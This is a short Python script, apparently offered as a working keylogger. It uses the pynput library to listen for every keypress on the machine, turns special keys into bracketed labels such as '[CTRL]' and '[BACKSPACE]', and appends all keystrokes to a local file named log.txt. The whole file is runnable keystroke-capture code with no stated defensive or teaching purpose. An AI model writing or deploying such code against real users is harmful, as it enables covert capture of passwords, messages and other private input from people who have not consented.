from pynput.keyboard import Listener

LOGFILENAME = "log.txt" # Changing this changes the filename where the keystrokes are written. Feel free to edit.

def writeToLog(key):
    keyData = str(key)                  # If you type the letter f, then keyData saves the value 'f' with single quotes.
    keyData = keyData.replace("'","")   # Remove the single quotes

    match keyData:                      # For special characters
        case "Key.alt":
            keyData = "[ALT]"
        case "Key.alt_gr":
            keyData = "[ALT GR]"
        case "Key.alt_l":
            keyData = "[LEFT ALT]"
        case "Key.alt_r":
            keyData = "[RIGHT ALT]"
        case "Key.backspace":
            keyData = "[BACKSPACE]"
        case "Key.caps_lock":
            keyData = "[CAPS LOCK]"
        case "Key.cmd":
            keyData = "[SUPER]"
        case "Key.cmd_l":
            keyData = "[SUPER LEFT]"
        case "Key.cmd_r":
            keyData = "[SUPER RIGHT]"
        case "Key.ctrl":
            keyData = "[CTRL]"
        case "Key.ctrl_l":
            keyData = "[LEFT CTRL]"
        case "Key.ctrl_r":
            keyData = "[RIGHT CTRL]"
        case "Key.delete":
            keyData = "[DELETE]"
        case "Key.down":
            keyData = "[DOWN ARROW]"
        case "Key.end":
            keyData = "[END]"
        case "Key.enter":
            keyData = "\n"
        case "Key.esc":
            keyData = "[ESCAPE]"
        case "Key.f1":
            keyData = "[F1]"
        case "Key.f2":
            keyData = "[F2]"
        case "Key.f3":
            keyData = "[F3]"
        case "Key.f4":
            keyData = "[F4]"
        case "Key.f5":
            keyData = "[F5]"
        case "Key.f6":
            keyData = "[F6]"
        case "Key.f7":
            keyData = "[F7]"
        case "Key.f8":
            keyData = "[F8]"
        case "Key.f9":
            keyData = "[F9]"
        case "Key.f10":
            keyData = "[F10]"
        case "Key.f11":
            keyData = "[F11]"
        case "Key.f12":
            keyData = "[F12]"
        case "Key.home":
            keyData = "[HOME]"
        case "Key.insert":
            keyData = "[INSERT]"
        case "Key.left":
            keyData = "[LEFT ARROW]"
        case "Key.menu":
            keyData = "[MENU]"
        case "Key.num_lock":
            keyData = "[NUM LOCK]"
        case "Key.page_down":
            keyData = "[PAGE DOWN]"
        case "Key.page_up":
            keyData = "[PAGE UP]"
        case "Key.pause":
            keyData = "[PAUSE]"
        case "Key.print_screen":
            keyData = "[PRINT SCREEN]"
        case "Key.right":
            keyData = "[RIGHT ARROW]"
        case "Key.scroll_lock":
            keyData = "[SCROLL LOCK]"
        case "Key.shift":
            keyData = "[SHIFT]"
        case "Key.shift_l":
            keyData = "[LEFT SHIFT]"
        case "Key.shift_r":
            keyData = "[RIGHT SHIF]"
        case "Key.space":
            keyData = " "
        case "Key.tab":
            keyData = "   "
        case "Key.up":
            keyData = "[UP ARROW]"
        case _:
            pass

    with open(LOGFILENAME, "a") as log: # Opens the file if exists, creates it if it does not. Opens in append mode.
        log.write(keyData)


with Listener(on_press=writeToLog) as listener:
    listener.join()